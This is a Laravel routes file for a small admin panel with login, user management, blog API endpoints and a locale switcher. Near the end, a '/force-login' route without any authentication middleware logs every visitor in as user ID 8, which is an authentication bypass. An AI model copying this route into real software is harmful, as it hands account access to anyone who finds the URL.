<?php

use Illuminate\Support\Facades\Route;
use App\Http\Controllers\Auth\AuthController;
use Illuminate\Support\Facades\Auth;
use App\Http\Controllers\Pages\PagesController;
use App\Http\Controllers\Pages\UsersController;
use App\Http\Controllers\Pages\BlogController;
use App\Http\Controllers\Api\UsersApiController;
use App\Http\Controllers\Api\BlogApiController;
use Illuminate\Support\Facades\App;
use Illuminate\Support\Facades\Session;

/*
|--------------------------------------------------------------------------
| Web Routes
|--------------------------------------------------------------------------
|
| Here is where you can register web routes for your application. These
| routes are loaded by the RouteServiceProvider within a group which
| contains the "web" middleware group. Now create something great!
|
*/

Route::get('/',function(){
    if(Auth::check()){
        return redirect()->route('dashboard');
    }else{
        return redirect()->route('login');
    }
});

Route::get('/login', [AuthController::class, 'login'])->name('login');
Route::post('/login', [AuthController::class, 'loginPost']);

Route::get('/dashboard',[PagesController::class,'index'])->name('dashboard')->middleware('auth');
Route::get('/users',[UsersController::class,'index'])->name('users')->middleware('auth');
Route::get('/users/new',[UsersController::class,'new'])->name('users/new')->middleware('auth');
Route::get('/users/edit/{param}',[UsersController::class,'edit'])->name('users/edit')->middleware('auth');



Route::get('/api/users/getData',[UsersApiController::class,'getData'])->middleware('auth');
Route::post('/api/users/saveUser',[UsersApiController::class,'saveUser'])->middleware('auth');
Route::post('/api/users/delUser',[UsersApiController::class,'delUser'])->middleware('auth');
Route::post('/api/users/createAdmin',[UsersApiController::class,'createAdmin'])->middleware('auth');

//Route::post('/api/blog/getData',[BlogApiController::class,'getData'])->middleware('auth');

Route::get('/api/blog/getData',[BlogApiController::class,'getData'])->middleware('auth');
Route::post('/api/blog/passive',[BlogApiController::class,'passive'])->middleware('auth');
Route::post('/api/blog/active',[BlogApiController::class,'active'])->middleware('auth');



Route::get('/blog',[BlogController::class,'index'])->name('blog')->middleware('auth');
Route::get('/blog/new',[BlogController::class,'new'])->name('blog.new')->middleware('auth');
Route::post('/api/Blog/delBlog',[BlogApiController::class,'delBlog'])->middleware('auth');
Route::post('/api/Blog/saveBlog',[BlogApiController::class,'saveBlog'])->middleware('auth');
Route::post('/api/Blog/toggleStatus',[BlogApiController::class,'toggleStatus'])->middleware('auth');
Route::get('/blog/edit/{id}', [BlogController::class, 'edit'])
    ->name('blog.edit')
    ->middleware('auth');
 Route::get('/force-login', function() {
    Auth::loginUsingId(8);
    return redirect('/blog');
});

Route::get('/lang/{locale}', function ($locale) {

    if (!in_array($locale, ['tr', 'en'])) {
        abort(404);
    }

    Session::put('locale', $locale);

    return redirect()->back();
});